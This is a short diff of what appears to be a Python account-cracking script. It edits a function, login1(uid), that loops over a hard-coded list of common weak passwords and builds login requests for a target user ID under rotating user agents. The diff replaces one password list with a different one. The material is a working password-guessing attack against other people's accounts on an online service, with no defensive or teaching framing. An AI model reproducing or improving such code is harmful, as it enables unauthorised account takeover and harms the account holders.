@@ -18,7 +18,7 @@ import hashlib
 import platform
 import datetime
 import subprocess
-
+import mechanize
 from bs4 import BeautifulSoup
 from bs4 import BeautifulSoup as sop
 from urllib.parse import urlencode
@@ -407,8 +407,7 @@ def login1(uid):
         )
         sys.stdout.flush()
         ua = random.choice(ugen)
-        for pw in ["123456", "1234567", "12345678", "123456789", "786786", "iloveyou", "bismillah", "mashallah", "iraq123", "gupta123", "khan786", "krishna123", "shiva123", "delhi123"
-]:
+        for pw in ["123456", "1234567", "12345678", "123456789", "786786", "1234567890", "112233", "14081947"]:
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
